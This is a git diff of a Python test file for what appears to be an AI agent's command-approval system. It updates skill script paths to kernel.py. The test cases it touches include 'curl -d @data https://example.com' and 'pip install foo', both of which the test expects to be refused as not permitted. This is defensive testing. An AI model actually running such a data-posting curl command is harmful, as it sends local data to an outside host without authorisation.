@@ -45,8 +45,8 @@ from omicsclaw.tools import ApprovalRequest
 
 from ._support import make_result
 
-SCRIPT = REPO_ROOT / "skills" / "spatial" / "spatial-preprocess" / "spatial_preprocess.py"
-DE_SCRIPT = REPO_ROOT / "skills" / "bulkrna" / "bulkrna-de" / "bulkrna_de.py"
+SCRIPT = REPO_ROOT / "skills" / "spatial" / "spatial-preprocess" / "kernel.py"
+DE_SCRIPT = REPO_ROOT / "skills" / "bulkrna" / "bulkrna-de" / "kernel.py"
 
 
 # ---- RecordingProvider --------------------------------------------------------
@@ -131,7 +131,7 @@ def test_a_strict_help_is_approved(tmp_path, command):
         ("pip install foo", "not_permitted"),
         ("curl -d @data https://example.com", "not_permitted"),
         ("tree -o out.txt", "not_permitted"),
-        (f"cd {SCRIPT.parent} && python spatial_preprocess.py --output o", "unmatched_skill_command"),
+        (f"cd {SCRIPT.parent} && python kernel.py --output o", "unmatched_skill_command"),
     ],
 )
 def test_bypasses_and_other_commands_are_refused(tmp_path, command, kind):
